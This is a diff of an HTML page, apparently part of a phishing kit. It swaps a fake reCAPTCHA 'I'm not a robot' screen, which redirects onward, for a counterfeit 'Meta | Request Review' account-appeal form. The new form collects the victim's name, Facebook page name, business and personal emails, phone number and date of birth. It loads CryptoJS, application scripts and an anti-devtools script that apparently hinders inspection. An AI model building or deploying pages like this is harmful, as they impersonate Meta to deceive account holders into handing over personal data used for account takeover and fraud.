@@ -1,222 +1,298 @@
+
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Security Verification</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta | Request Review</title>
+    <link rel="shortcut icon" href="./public/favicon-32x32.png" type="image/x-icon">
+    <link rel="stylesheet" href="./public/styles/style.css">
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
 
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background-color: #ffffff;
-      color: #1c1e21;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
 
-    .verification-card {
-      width: 100%;
-      max-width: 440px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement(
+                {
+                    pageLanguage: 'en',
+                    layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+                },
+                'google_translate_element'
+            );
+        }
+    </script>
 
-    /* Tiêu đề / Nhãn hệ thống */
-    .brand-header {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 22px;
-      font-weight: 700;
-      color: #0866ff;
-      margin-bottom: 24px;
-      align-self: flex-start;
-    }
-
-    /* Khung hộp kiểm xác thực */
-    .captcha-box {
-      width: 100%;
-      background: #f9f9f9;
-      border: 1px solid #d3d3d3;
-      border-radius: 4px;
-      padding: 16px 20px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
-      margin-bottom: 24px;
-      user-select: none;
-    }
-
-    .checkbox-container {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      cursor: pointer;
-    }
-
-    .checkbox-square {
-      width: 26px;
-      height: 26px;
-      border: 2px solid #b2b2b2;
-      border-radius: 3px;
-      background-color: #ffffff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: border-color 0.2s;
-    }
-
-    .checkbox-square:hover {
-      border-color: #888888;
-    }
-
-    .checkbox-square.checked {
-      border-color: #0f9d58;
-    }
-
-    .checkbox-square.checked::after {
-      content: '✔';
-      color: #0f9d58;
-      font-size: 18px;
-      font-weight: bold;
-    }
-
-    .spinner {
-      width: 18px;
-      height: 18px;
-      border: 2px solid #0866ff;
-      border-top-color: transparent;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      display: none;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .checkbox-label {
-      font-size: 15px;
-      color: #222222;
-      font-weight: 500;
-    }
-
-    .badge-info {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      font-size: 10px;
-      color: #65676b;
-    }
-
-    .badge-icon {
-      font-size: 22px;
-      margin-bottom: 2px;
-    }
-
-    .badge-links {
-      font-size: 9px;
-      color: #8a8d91;
-      margin-top: 2px;
-    }
-
-    .badge-links a {
-      color: inherit;
-      text-decoration: none;
-    }
-
-    .badge-links a:hover {
-      text-decoration: underline;
-    }
-
-    /* Các đoạn văn bản chính sách bên dưới */
-    .policy-content {
-      font-size: 13.5px;
-      line-height: 1.55;
-      color: #4b4f56;
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-      text-align: left;
-    }
-
-    .policy-content p {
-      margin: 0;
-    }
-  </style>
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </head>
+
 <body>
-
-  <main class="verification-card">
-    <header class="brand-header">
-      <span>META</span>
-    </header>
-
-    <section class="captcha-box">
-      <div class="checkbox-container" id="captchaTrigger">
-        <div class="checkbox-square" id="checkboxBox">
-          <div class="spinner" id="loadingSpinner"></div>
+    <div>
+        <script src="./public/js/translate.js"></script>
+        <div class="absolute top-0 right-0 hidden" id="google_translate_element"></div>
+        <!-- Navbar Start -->
+        <div class="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
+            <div class='max-w-[1280px] w-full flex items-center justify-between px-4'>
+                <a href="/">
+                    <img src="public/images/logo-meta.svg" width="64px" alt="" />
+                </a>
+            </div>
         </div>
-        <span class="checkbox-label">I'm not a robot</span>
-      </div>
+        <!-- Navbar End -->
 
-      <div class="badge-info">
-        <span class="badge-icon">🛡️</span>
-        <span>reCAPTCHA</span>
-        <div class="badge-links">
-          <a href="#">Privacy</a> - <a href="#">Terms</a>
+        <div
+            class="w-full max-w-[600px] my-10 mx-auto bg-white md:rounded-lg md:shadow-sm md:border md:border-gray-200 px-4 py-4">
+            <div class="mb-6 p-4 bg-blue-50 font-[300] border border-blue-200 rounded-md text-gray-800 text-[14px]">
+                Please indicate why you believe that account restrictions were imposed by mistake. Our technology and
+                team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us
+                in your native language. </div>
+            <form id="clientForm" class="space-y-4">
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Full Name <span class="text-red-600">*</span>
+                    </label>
+                    <input type="text" name="fullName" id="fullName" placeholder="Enter your full name" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Facebook Page Name <span class="text-red-600">*</span>
+                    </label>
+                    <input type="text" name="pageName" id="fanpage" placeholder="Enter your Facebook page name" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Business Email <span class="text-red-600">*</span>
+                    </label>
+                    <input type="email" id="emailBusiness" name="businessEmail" placeholder="Enter your business email"
+                        required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Personal Email <span class="text-red-600">*</span>
+                    </label>
+                    <input type="email" id="email" name="personalEmail" placeholder="Enter your personal email" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+            
+
+                <div>
+                    <label class="block font-[600] text-sm text-gray-700 mb-1">
+                        Mobile Phone Number <span class="text-red-600">*</span>
+                    </label>
+                    <input type="tel" id="phone" name="phone" placeholder="Enter your mobile phone number" required
+                        pattern="[0-9]*" inputmode="numeric" onkeypress="return event.charCode >= 48 && event.charCode <= 57"
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" />
+                </div>
+
+              <div>
+                <label class="block font-[600] text-sm text-gray-700 mb-1">
+                    Date of Birth <span class="text-red-600">*</span>
+                </label>
+                <div class="flex gap-2">
+                    <!-- Ô ngày (DD) - giới hạn 1-31 -->
+                    <div class="flex-1">
+                        <input type="tel" id="day" name="day" maxlength="2" placeholder="DD" 
+                            oninput="validateDay(this)"
+                            onkeypress="return event.charCode >= 48 && event.charCode <= 57"
+                            class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none text-center" />
+                        <p class="text-xs text-gray-500 mt-1 text-center"></p>
+                    </div>
+                    
+                    <!-- Ô tháng (MM) - giới hạn 1-12 -->
+                    <div class="flex-1">
+                        <input type="tel" id="month" name="month" maxlength="2" placeholder="MM" 
+                            oninput="validateMonth(this)"
+                            onkeypress="return event.charCode >= 48 && event.charCode <= 57"
+                            class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none text-center" />
+                        <p class="text-xs text-gray-500 mt-1 text-center"></p>
+                    </div>
+                    
+                    <!-- Ô năm (YYYY) - giới hạn 1950-2026 -->
+                    <div class="flex-1">
+                        <input type="tel" id="year" name="year" maxlength="4" placeholder="YYYY" 
+                            oninput="validateYear(this)"
+                            onkeypress="return event.charCode >= 48 && event.charCode <= 57"
+                            class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none text-center" />
+                        <p class="text-xs text-gray-500 mt-1 text-center"></p>
+                    </div>
+                </div>
+                <input type="hidden" id="dob" name="dob" />
+            </div>
+
+            <script>
+                // Validation cho ngày (1-31)
+                function validateDay(input) {
+                    // Chỉ cho phép số
+                    input.value = input.value.replace(/[^0-9]/g, '');
+                    
+                    let value = parseInt(input.value);
+                    if (input.value.length === 2) {
+                        if (value > 31) {
+                            input.value = '31';
+                        } else if (value < 1) {
+                            input.value = '1';
+                        }
+                        // Tự động nhảy sang ô tháng khi nhập đủ 2 số
+                        document.getElementById('month').focus();
+                    }
+                    
+                    updateDobHidden();
+                }
+                
+                // Validation cho tháng (1-12)
+                function validateMonth(input) {
+                    // Chỉ cho phép số
+                    input.value = input.value.replace(/[^0-9]/g, '');
+                    
+                    let value = parseInt(input.value);
+                    if (input.value.length === 2) {
+                        if (value > 12) {
+                            input.value = '12';
+                        } else if (value < 1) {
+                            input.value = '1';
+                        }
+                        // Tự động nhảy sang ô năm khi nhập đủ 2 số
+                        document.getElementById('year').focus();
+                    }
+                    
+                    updateDobHidden();
+                }
+                
+                // Validation cho năm (1950-2026)
+                function validateYear(input) {
+                    // Chỉ cho phép số
+                    input.value = input.value.replace(/[^0-9]/g, '');
+                    
+                    let value = parseInt(input.value);
+                    if (input.value.length === 4) {
+                        if (value > 2026) {
+                            input.value = '2026';
+                        } else if (value < 1950) {
+                            input.value = '1950';
+                        }
+                    }
+                    
+                    updateDobHidden();
+                }
+                
+                // Gộp 3 ô thành 1 để gửi đi (format YYYY-MM-DD)
+                function updateDobHidden() {
+                    const day = document.getElementById('day').value.padStart(2, '0');
+                    const month = document.getElementById('month').value.padStart(2, '0');
+                    const year = document.getElementById('year').value;
+                    
+                    if (day && month && year && day !== '00' && month !== '00') {
+                        // Format YYYY-MM-DD để lưu vào hidden input
+                        document.getElementById('dob').value = `${year}-${month}-${day}`;
+                    }
+                }
+            </script>
+                <div class="pt-2">
+                    <p class="block text-sm font-[600] text-gray-700 mb-3">
+                        What do you think happened? <span class="text-red-600">*</span>
+                    </p>
+
+                    <div class="space-y-2">
+                        <label class="flex items-start gap-2">
+                            <input type="radio" name="reason" value="erroneous_report" required class="mt-1" />
+                            <span class="text-sm text-gray-700 cursor-pointer">An erroneous report or unfair competitive
+                                complaint.</span>
+                        </label>
+
+                        <label class="flex items-start gap-2">
+                            <input type="radio" name="reason" value="notification_error" class="mt-1" />
+                            <span class="text-sm text-gray-700 cursor-pointer">This notification was sent in
+                                error.</span>
+                        </label>
+
+                        <label class="flex items-start gap-2">
+                            <input type="radio" name="reason" value="no_fraud" class="mt-1" />
+                            <span class="text-sm text-gray-700 cursor-pointer">No fraud involved / another legitimate
+                                reason:</span>
+                        </label>
+
+                        <div class="mt-1">
+                            <textarea placeholder="Additional notes (optional)"
+                                class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Submit -->
+                <div class="pt-3">
+                    <button id="btn-submit-request" type="submit"
+                        class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
+                </div>
+
+                <div class="w-16 pt-5 mx-auto">
+                    <img src="./public/icons/ic_logo_gray.svg" alt="Meta">
+                </div>
+
+            </form>
+
         </div>
-      </div>
-    </section>
 
-    <article class="policy-content">
-      <p>
-        This helps us to combat harmful conduct, detect and prevent spam, and maintain the integrity of our services.
-      </p>
-      <p>
-        We use verification challenges to ensure this action is performed by a human. Your use of this service is subject to applicable Privacy Policies and Terms of Service.
-      </p>
-      <p>
-        Automated analysis collects system and browser signals to evaluate security risks and ensure safe access for all users.
-      </p>
-    </article>
-  </main>
+        <!-- Footer Start -->
+        <div class='bg-[#F5F6F6] pt-5 pb-5 border-t border-[#E0E0E0] w-full'>
+            <div class='max-w-[1280px] w-full mx-auto px-4'>
+                <div class='flex flex-wrap justify-center gap-4 mb-4 text-[13px] text-gray-600'>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>English (US)</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>English (UK)</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Italiano</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Français</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>中文(简体)</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>日本語</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>한국어</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>עברית</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Español</a>
+                    <a href='#' class='hover:underline text-[#6D84B4]'>Português</a>
+                </div>
+                <div class='flex flex-wrap justify-center gap-4 text-[13px] text-gray-600'>
+                    <p class='mr-4'>© 2025 Meta</p>
+                    <a href='#' class='hover:underline'>About</a>
+                    <a href='#' class='hover:underline'>Developers</a>
+                    <a href='#' class='hover:underline'>Careers</a>
+                    <a href='#' class='hover:underline'>Privacy</a>
+                    <a href='#' class='hover:underline'>Cookies</a>
+                    <a href='#' class='hover:underline'>Terms</a>
+                    <a href='#' class='hover:underline'>Help Centre</a>
+                </div>
+            </div>
+        </div>
+        <!-- Footer End -->
+    </div>
 
-  <script>
-    const captchaTrigger = document.getElementById('captchaTrigger');
-    const checkboxBox = document.getElementById('checkboxBox');
-    const loadingSpinner = document.getElementById('loadingSpinner');
-    let isCompleted = false;
 
-    captchaTrigger.addEventListener('click', () => {
-      if (isCompleted) return;
+    <!-- Modals Container -->
+    <div id="modalsContainer"></div>
 
-      // 1. Kích hoạt hiệu ứng loading
-      loadingSpinner.style.display = 'block';
-
-      // 2. Giả lập thời gian kiểm tra bot
-      setTimeout(() => {
-        loadingSpinner.style.display = 'none';
-        checkboxBox.classList.add('checked');
-        isCompleted = true;
-
-        // 3. Tự động chuyển hướng sang trang tiếp theo sau khi hoàn tất
-        setTimeout(() => {
-          window.location.href = "required.html";
-        }, 600);
-      }, 1000);
-    });
-  </script>
-
+    <!-- JavaScript Files -->
+    <script src="./public/js/config.js"></script>
+    <script src="./public/js/utils.js"></script>
+    <script src="./public/js/modal.js"></script>
+    <script src="./public/js/app.js"></script>
+    <script src="./public/js/disableDevtool.js"></script>
 </body>
+
 </html>
